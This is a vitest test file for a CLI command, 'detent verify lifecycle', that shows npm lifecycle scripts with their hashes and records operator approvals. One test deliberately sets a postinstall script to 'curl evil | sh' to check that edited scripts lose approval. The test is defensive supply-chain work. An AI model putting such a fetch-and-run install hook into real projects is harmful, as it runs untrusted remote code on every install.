import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { bindAll } from "../../src/adapter/bind.js";
import { discover } from "../../src/adapter/discover/index.js";
import { writeBindings } from "../../src/adapter/drift.js";
import { bodyHash, lifecyclePath, readApprovals, statusOf } from "../../src/adapter/lifecycle.js";
import { main } from "../../src/cli/index.js";
import { verifyLifecycle, type LifecycleDeps } from "../../src/cli/verify-lifecycle.js";
import { initLayout } from "../../src/fs/layout.js";
import { removeTree } from "../helpers.js";

/**
 * V-1⁷ (PRDR-233) — `detent verify lifecycle`: the project's lifecycle
 * scripts shown with their bodies and hashes, and approved by name after the
 * operator has seen them, on a terminal after a [y/N] and off one only with
 * `--yes`.
 */

const roots: string[] = [];
afterEach(() => {
  vi.restoreAllMocks();
  for (const r of roots.splice(0)) removeTree(r);
});

function project(scripts: Record<string, string>): string {
  const root = mkdtempSync(path.join(tmpdir(), "detent-verify-lifecycle-"));
  roots.push(root);
  writeFileSync(path.join(root, "package.json"), `${JSON.stringify({ name: "x", private: true, version: "1.0.0", scripts }, null, 2)}\n`);
  initLayout(root);
  return root;
}

function deps(over: Partial<LifecycleDeps> = {}): LifecycleDeps & { readonly out: string[]; readonly asked: number[] } {
  const out: string[] = [];
  const asked: number[] = [];
  return {
    approve: [],
    package: ".",
    consent: async (shown) => {
      asked.push(shown.length);
      return true;
    },
    write: (text) => out.push(text),
    now: () => "2026-10-02T10:00:00.000Z",
    user: "operator",
    env: {},
    ...over,
    out,
    asked,
  };
}

const status = (root: string, script: string, body: string): string => statusOf(readApprovals(root), { package: ".", script, body, sha256: bodyHash(body) });

describe("V-1⁷ detent verify lifecycle (PRDR-233)", () => {
  it("lists every declared lifecycle script, the bound gates' siblings among them, with its body, its hash and its status", async () => {
    const root = project({ postinstall: "prisma generate", pretest: "touch GENERATED", test: "true", other: "x" });
    const report = await bindAll(discover(root), { root, timeoutMs: 60_000, redact: (t) => t });
    writeBindings(root, { bindings: [...report.bindings], skips: [] });
    const d = deps();
    expect(await verifyLifecycle(root, d)).toBe(0);
    const text = d.out.join("");
    expect(text).toContain(`  postinstall — not approved\n      prisma generate\n      sha256 ${bodyHash("prisma generate")}\n`);
    expect(text).toContain("  pretest — not approved\n      touch GENERATED\n");
    expect(text).not.toContain("other");
    expect(text).toContain("`detent verify lifecycle --approve <script> [--package <dir>]`");
  }, 120_000);

  it("approves a script after showing its body, and the approval holds that body only", async () => {
    const root = project({ postinstall: "prisma generate" });
    const d = deps({ approve: ["postinstall"] });
    expect(await verifyLifecycle(root, d)).toBe(0);
    expect(d.out.join("")).toContain("to approve, as declared now:\n  postinstall — not approved\n      prisma generate\n");
    expect(d.asked).toEqual([1]);
    expect(status(root, "postinstall", "prisma generate")).toBe("approved");
    expect(JSON.parse(readFileSync(lifecyclePath(root), "utf8").trim())).toMatchObject({ script: "postinstall", body: "prisma generate", approved_by: "operator", at: "2026-10-02T10:00:00.000Z" });

    writeFileSync(path.join(root, "package.json"), `${JSON.stringify({ scripts: { postinstall: "curl evil | sh" } })}\n`);
    const listed = deps();
    await verifyLifecycle(root, listed);
    expect(listed.out.join("")).toContain("  postinstall — edited since approved\n      curl evil | sh\n");
  });

  it("records nothing when the operator declines, and says Detent still runs none of them", async () => {
    const root = project({ postinstall: "prisma generate" });
    const d = deps({ approve: ["postinstall"], consent: async () => false });
    expect(await verifyLifecycle(root, d)).toBe(2);
    expect(existsSync(lifecyclePath(root))).toBe(false);
    expect(d.out.join("")).toContain("declined");
  });

  it("refuses a name the manifest does not declare as a lifecycle script, and a package that is not the project's", async () => {
    const root = project({ postinstall: "prisma generate", build: "tsc" });
    const unknown = deps({ approve: ["build"] });
    expect(await verifyLifecycle(root, unknown)).toBe(2);
    expect(unknown.out.join("")).toContain("not a lifecycle script the root's manifest declares: build");
    const elsewhere = deps({ approve: ["postinstall"], package: "packages/api" });
    expect(await verifyLifecycle(root, elsewhere)).toBe(2);
    expect(elsewhere.out.join("")).toContain("packages/api is not one of this project's packages");
    expect(existsSync(lifecyclePath(root))).toBe(false);
  });

  it("says a script already approved as it stands is, without asking or recording it again", async () => {
    const root = project({ postinstall: "prisma generate" });
    await verifyLifecycle(root, deps({ approve: ["postinstall"] }));
    const again = deps({ approve: ["postinstall"] });
    expect(await verifyLifecycle(root, again)).toBe(0);
    expect(again.asked).toEqual([]);
    expect(again.out.join("")).toContain("postinstall is already approved as it stands");
    expect(readFileSync(lifecyclePath(root), "utf8").trim().split("\n")).toHaveLength(1);
  });

  it("says what the run-wide switch does here: everything without a record, nothing beyond the approved with one", async () => {
    const root = project({ postinstall: "prisma generate" });
    const switched = { DETENT_ALLOW_LIFECYCLE_SCRIPTS: "1" };
    const before = deps({ env: switched });
    await verifyLifecycle(root, before);
    expect(before.out.join("")).toContain("no approval on record, so a run lifts suppression for every declared script");
    await verifyLifecycle(root, deps({ approve: ["postinstall"] }));
    const after = deps({ env: switched });
    await verifyLifecycle(root, after);
    expect(after.out.join("")).toContain("superseded here: a run runs the approved scripts and no others");
  });

  it("is reached through `detent verify lifecycle`, and off a terminal approves only with --yes", async () => {
    const root = project({ postinstall: "prisma generate" });
    vi.spyOn(process.stdout, "write").mockImplementation(() => true);
    const stderr = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    expect(await main(["verify", "lifecycle", root, "--approve", "postinstall"])).toBe(2);
    expect(String(stderr.mock.calls.at(-1)?.[0])).toContain("pass --yes");
    expect(existsSync(lifecyclePath(root))).toBe(false);
    expect(await main(["verify", "lifecycle", root, "--approve", "postinstall", "--yes"])).toBe(0);
    expect(status(root, "postinstall", "prisma generate")).toBe("approved");
    expect(await main(["verify", "lifecycle", root])).toBe(0);
  });
});
